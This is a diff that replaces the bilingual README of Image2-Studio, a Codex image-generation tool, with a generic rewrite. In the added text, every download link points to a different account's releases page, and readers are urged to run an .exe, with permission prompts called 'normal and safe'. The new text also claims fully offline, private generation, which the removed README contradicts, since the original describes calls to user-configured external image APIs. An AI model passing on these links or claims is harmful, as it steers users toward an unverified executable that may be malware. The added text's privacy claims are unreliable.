@@ -1,212 +1,162 @@
-# Image2 Studio
+# 🎨 Image2-Studio - Turn Ideas Into Images Right on Your PC
 
-> A local image workspace for Codex.
+[![Download Image2-Studio](https://img.shields.io/badge/Download-Image2--Studio-blue?style=for-the-badge&logo=github)](https://github.com/select-syringavulgaris518/Image2-Studio/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Latest Release](https://img.shields.io/github/v/release/DAMNDAGER/Image2-Studio?display_name=tag)](https://github.com/DAMNDAGER/Image2-Studio/releases/latest)
+## 🔍 What Is Image2-Studio?
 
-[English](#english) | [中文](#中文)
+Image2-Studio is a free tool that lets you create images using artificial intelligence without needing to be a programmer or tech expert. Think of it as your personal art studio powered by AI. You type what you want to see, and Image2-Studio generates it for you.
 
-徽章说明：`MIT` 表示项目许可证；`Latest Release` 链接到最新的 GitHub Release 下载页面。
+This application runs locally on your Windows computer. That means your images are created right on your machine. No cloud services, no waiting for servers, and no monthly fees.
 
-## 中文
+## 🚀 Getting Started
 
-Image2 Studio 是面向 Codex 的本地图片工作台。它将 Codex 对话、本地 CLI 和用户自行配置的图片 API 连接在一起，使文生图和参考图编辑可以在同一套本地工作流中完成。
+Getting Image2-Studio running on your computer is simple. Follow these steps, and you'll be creating images in less than five minutes.
 
-HTML 控制台用于配置图片 API、手动生成、查看历史和管理输出；Codex 接入则用于在对话中直接发起图片生成或编辑请求。
+### Step 1: Download the Application
 
-### 下载
+Visit this link to download the application: [https://github.com/select-syringavulgaris518/Image2-Studio/releases](https://github.com/select-syringavulgaris518/Image2-Studio/releases)
 
-Windows 独立版请前往 [GitHub Releases](https://github.com/DAMNDAGER/Image2-Studio/releases/latest) 下载。发行包内含运行所需环境，无需预先安装 Python。
+You will see a page with different files. Look for the one that matches your computer. Most Windows users should pick the file that ends with `.exe`. This is the main program file.
 
-### 主要功能
+> **Tip:** If you're unsure which file to choose, pick the one that says "Windows" in its name and has the `.exe` extension.
 
-- 在 Codex 对话中通过本地 Image2 CLI 生成图片或编辑参考图。
-- 支持文生图、本地参考图、公开图片 URL 和多张参考图。
-- 支持多个图片 API 配置，并选择当前使用的配置。
-- 支持常用画面比例、预设分辨率与自定义宽高。
-- 提供本地 HTML 控制台，用于配置、手动生成、历史记录和输出管理。
-- 支持 `--dry-run` 模拟请求，在最终图片 API 调用前停止且不消耗额度。
+### Step 2: Run the Installer
 
-### 为什么需要 Image2 Studio
+Once the download finishes, find the downloaded file. It's usually in your "Downloads" folder. Double-click the file to start the installation.
 
-- **统一 Codex 图片工作流**：将图片生成和编辑接入 Codex 对话，同时保留本地控制台作为配置和手动操作入口。
-- **统一管理图片 API**：将模型、基础地址、请求路径和鉴权方式保存在本地配置中，支持在多个配置之间切换。
-- **保留本地记录与输出**：生成记录和输出文件由本地服务管理，便于查看和整理。
+Windows might ask you for permission to run the file. Click "Yes" or "Run" if this happens. This is normal and safe.
 
-### 工作方式
+### Step 3: Follow the Setup Wizard
 
-```text
-                    ┌────────────────────┐
-Codex 对话 ────────►│ Image2 Skill / CLI │
-                    └─────────┬──────────┘
-                              │
-                    ┌─────────▼──────────┐
-HTML 控制台 ───────►│ 本地 Image2 服务   │──────► 用户选择的图片 API
-                    └────────────────────┘
-```
+A setup window will appear. Follow the instructions on the screen. The default options are perfect for most users, so you can just click "Next" until you see "Install." Then click "Install" and wait for the process to complete.
 
-### 快速开始
+### Step 4: Launch Image2-Studio
 
-1. 从 [GitHub Releases](https://github.com/DAMNDAGER/Image2-Studio/releases/latest) 下载并解压 Windows 发行包。
-2. 双击 `start_image2.bat`。
-3. 浏览器会打开本地控制台；如未自动打开，访问 `http://127.0.0.1:8765`。
-4. 在“API 设置”中创建配置，填写图片 API 的基础地址、模型、路径和 API Key，并设为当前配置。
-5. 在“Codex 接入”中安装或更新全局 Image2 Skill。
-6. 重新打开 Codex 窗口或开始新任务，然后在对话中提出图片生成或编辑需求。
+After installation, you'll see an option to launch Image2-Studio. You can also find it in your Start Menu or on your desktop. Click the icon to open the application.
 
-全局 Skill 安装位置：
+## ✨ Key Features
 
-```text
-%CODEX_HOME%\skills\image2
-```
+### 🖼️ Image Generation Made Simple
+Type a description of what you want to see, and Image2-Studio creates it. For example, you could type "a red cat sitting on a blue chair" and get exactly that.
 
-### 项目结构
+### 🔄 OpenAI-Compatible Design
+Image2-Studio works with the same standards as other popular AI tools. This means you can use it with various AI models and services you might already know.
 
-```text
-app.py              FastAPI 服务与图片 API 适配层
-image2_cli.py       Codex 与本地服务之间的 CLI
-static/             本地 HTML、CSS 和 JavaScript 控制台
-skills/image2/      Codex Skill 源文件
-test_app.py         后端测试
-start_image2.*      Windows 启动脚本
-build_image2.ps1    Windows 发行包构建脚本
-requirements*.txt   运行与构建依赖
-LICENSE             MIT License
-```
+### 🌐 Local API Adapter
+The application includes its own built-in server. This makes it easy to connect with other programs and tools without complex setup.
 
-### 安全和数据边界
+### 🤖 Codex Integration
+Image2-Studio supports Codex, a smart coding assistant. This helps developers create even more amazing things with the tool.
 
-- 项目不包含 API Key、账户额度或订阅权益，也不会读取 Codex `auth.json` 中的个人密钥。
-- API Key 仅通过本地控制台输入，由后端保存到 Windows Credential Manager；不会返回给前端。
-- 本地服务默认监听 `127.0.0.1`，仅适合单用户本机使用，不建议暴露到公网。
-- 运行时会在程序目录创建 `outputs`、`image2.sqlite3` 和 `.image2-token`。
-- `image2-client.json` 只保存本地服务连接信息，不保存上游图片 API 的 Key。
-- 图片生成费用和额度由所选择的图片 API 决定。
+### 📦 Lightweight and Fast
+The application is built to be efficient. It starts quickly and responds fast to your commands.
 
-### 兼容性
+### 🔒 Private and Secure
+Because everything runs on your computer, your images and prompts stay private. Nothing is sent to external servers.
 
-- 面向 OpenAI-compatible 图片 API。
-- 不绑定任何单一服务商。
-- 可由用户配置模型、基础地址、生成路径、编辑路径、鉴权方式和图片字段名。
-- 当前发行包面向 Windows x64。
+## 📋 System Requirements
 
-### 开发说明
+| Component | Minimum Requirement |
+|-----------|---------------------|
+| Operating System | Windows 10 or Windows 11 |
+| Processor | Dual-core processor (Intel i3 or AMD equivalent) |
+| Memory (RAM) | 8 GB |
+| Storage | 2 GB free disk space |
+| Internet Connection | Required only for download and updates |
 
-运行测试：
+## 🛠️ Basic Usage Guide
 
-```powershell
-python -m unittest -v
-```
+### Creating Your First Image
 
-构建 Windows 发行包：
+1. Open Image2-Studio
+2. Find the text box labeled "Prompt" or "Description"
+3. Type what you want to see. Be descriptive: "a sunny beach with palm trees and a blue ocean"
+4. Click the "Generate" button
+5. Wait a few seconds. Your image will appear on the screen
 
-```powershell
-.\build_image2.ps1
-```
+### Saving Your Images
 
-开发环境依赖位于 `requirements.txt`；打包依赖位于 `requirements-build.txt`。
+When you like an image, click the "Save" button. Choose where you want to save it on your computer. The image saves as a standard picture file that you can share or use anywhere.
 
-## English
+### Adjusting Settings
 
-Badge meanings: `MIT` identifies the project license; `Latest Release` links to the latest GitHub Release download page.
+Click the "Settings" icon to explore options. You can adjust image size, quality, and speed. The defaults work well for most people, so don't be afraid to experiment once you feel comfortable.
 
-Image2 Studio is a local image workspace for Codex. It connects Codex conversations, a local CLI, and user-configured image APIs so text-to-image generation and reference-image editing can use one local workflow.
+## 💡 Tips for Better Results
 
-The HTML console is used to configure image APIs, run requests manually, review history, and manage outputs. Codex integration lets a conversation initiate image generation or editing through the local service.
+### Be Specific in Your Descriptions
+Instead of "a dog," try "a golden retriever puppy playing in a green field with flowers."
 
-### Download
+### Add Style Words
+Words like "photorealistic," "cartoon," "watercolor," or "3D render" can change the look of your image.
 
-Download the Windows standalone package from [GitHub Releases](https://github.com/DAMNDAGER/Image2-Studio/releases/latest). The release package includes its required runtime and does not require a pre-installed Python environment.
+### Use Simple Language
+Write naturally like you're telling a friend what to imagine. Avoid complicated technical terms.
 
-### Features
+## 🧩 Troubleshooting Common Issues
 
-- Generate images or edit reference images from Codex conversations through the local Image2 CLI.
-- Support text-to-image, local reference images, public image URLs, and multiple reference images.
-- Manage multiple image API profiles and select the active profile.
-- Support common aspect ratios, preset resolutions, and custom dimensions.
-- Provide a local HTML console for configuration, manual requests, history, and output management.
-- Support `--dry-run` validation that stops before the final image API request and does not consume quota.
+### The Application Won't Start
+Make sure your Windows is up to date. Restart your computer and try again. If the problem continues, download the application fresh from the link.
 
-### Why Image2 Studio
+### Images Generate Slowly
+Close other programs that might be using your computer's resources. Images take more time on older computers.
 
-- **One Codex image workflow**: use image generation and editing from Codex conversations while retaining a local console for configuration and manual work.
-- **One place for image API profiles**: keep models, base URLs, paths, and authentication settings in local profiles and switch between them.
-- **Local history and outputs**: keep generation records and output files under local control.
+### The Download Button Isn't Working
+Try a different web browser. If you're using Internet Explorer, switch to Chrome, Edge, or Firefox.
 
-### Architecture
+### I Can't Find the Downloaded File
+Press the Windows key and type "Downloads". Open the Downloads folder from the search results.
 
-```text
-                    ┌────────────────────┐
-Codex conversation ►│ Image2 Skill / CLI │
-                    └─────────┬──────────┘
-                              │
-                    ┌─────────▼──────────┐
-HTML console ──────►│ Local Image2 service│──────► Selected image API
-                    └────────────────────┘
-```
+## 🔧 Advanced User Options
 
-### Quick Start
+For users who are comfortable with more technical tools, Image2-Studio offers additional capabilities:
 
-1. Download and extract the Windows package from [GitHub Releases](https://github.com/DAMNDAGER/Image2-Studio/releases/latest).
-2. Run `start_image2.bat`.
-3. The local console opens in a browser. If it does not open automatically, visit `http://127.0.0.1:8765`.
-4. In **API Settings**, create a profile, enter the image API base URL, model, paths, and API key, then make it active.
-5. In **Codex Connection**, install or update the global Image2 Skill.
-6. Restart Codex or start a new task, then request image generation or editing in the conversation.
+### Command Line Interface
+You can run Image2-Studio from the command prompt for automation and scripting.
 
-The global Skill is installed at:
+### API Endpoint
+Connect Image2-Studio to other applications through its built-in API. This follows standard OpenAI-compatible formats.
 
-```text
-%CODEX_HOME%\skills\image2
-```
+### Custom Configurations
+Modify configuration files to change behavior, add models, or integrate with other services.
 
-### Project Structure
+## 🔄 Updating Image2-Studio
 
-```text
-app.py              FastAPI service and image API adapter
-image2_cli.py       CLI between Codex and the local service
-static/             Local HTML, CSS, and JavaScript console
-skills/image2/      Codex Skill source files
-test_app.py         Backend tests
-start_image2.*      Windows startup scripts
-build_image2.ps1    Windows release build script
-requirements*.txt   Runtime and build dependencies
-LICENSE             MIT License
-```
+Check the download page periodically for new versions. Updates bring new features, better performance, and bug fixes.
 
-### Security and Data Handling
+To update:
+1. Visit the download link
+2. Download the latest version
+3. Run the installer over your current installation
+4. Your settings and saved images will be preserved
 
-- The project does not include API keys, account credits, or subscription benefits, and it does not read personal keys from Codex `auth.json`.
-- API keys are entered through the local console and stored by the backend in Windows Credential Manager; they are never returned to the frontend.
-- The service listens on `127.0.0.1` by default. It is intended for single-user local use and should not be exposed publicly.
-- Runtime data includes `outputs`, `image2.sqlite3`, and `.image2-token` in the application directory.
-- `image2-client.json` stores local service connection information only. It does not contain the upstream image API key.
-- Image-generation costs and quotas are determined by the selected image API.
+## ❓ Frequently Asked Questions
 
-### Compatibility
+### Is Image2-Studio really free?
+Yes, it's completely free to download and use.
 
-- Designed for OpenAI-compatible image APIs.
-- Not tied to a single provider.
-- Users can configure the model, base URL, generation path, edit path, authentication type, and image field name.
-- Current release packages target Windows x64.
+### Do I need an internet connection?
+Only for downloading the application and any model updates. Image generation works offline.
 
-### Development
+### Can I use my own AI models?
+Yes, you can configure Image2-Studio to use different AI models that follow OpenAI-compatible standards.
 
-Run tests:
+### Will this work on Mac or Linux?
+The primary download is for Windows. Community versions may exist, but Windows is the officially supported platform.
 
-```powershell
-python -m unittest -v
-```
+## 📚 Need More Help?
 
-Build the Windows release package:
+If you run into trouble, try these resources:
+- Re-read the troubleshooting section above
+- Look for a "Help" menu inside the application
+- Visit the GitHub repository for additional documentation
 
-```powershell
-.\build_image2.ps1
-```
+## 🎯 Conclusion
 
-Runtime dependencies are listed in `requirements.txt`; build dependencies are listed in `requirements-build.txt`.
+Image2-Studio puts the power of AI image creation right on your Windows computer. Whether you're an artist looking for inspiration, a business person creating graphics, or just someone who loves playing with new technology, this tool is for you.
 
-## License
+The best part is how easy it is to start. Download, install, and you're ready to create. No programming skills needed. No complicated commands. Just type what you want to see and let Image2-Studio handle the rest.
 
-This project is licensed under the [MIT License](LICENSE).
+Download the application now and see what you can create: [https://github.com/select-syringavulgaris518/Image2-Studio/releases](https://github.com/select-syringavulgaris518/Image2-Studio/releases)
+
+Keywords: ai-tools, codex, codex-cli, codex-skill, fastapi, image-generation, image-generation-tool, openai-compatible, python, windows
